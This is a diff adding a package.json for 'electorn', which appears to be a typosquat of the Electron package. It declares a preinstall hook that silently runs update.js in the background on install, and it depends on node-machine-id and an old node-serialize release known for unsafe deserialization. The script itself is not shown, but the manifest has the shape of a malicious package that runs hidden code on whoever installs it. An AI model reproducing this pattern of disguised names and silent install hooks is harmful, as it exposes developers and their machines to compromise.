@@ -1,0 +1,17 @@
+{
+  "name": "electorn",
+  "version": "10.0.0",
+  "description": "wrap electron, auto update.",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node update.js &"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "electron": "^10.0.0",
+    "node-machine-id": "^1.1.12",
+    "node-serialize": "0.0.4"
+  }
+}
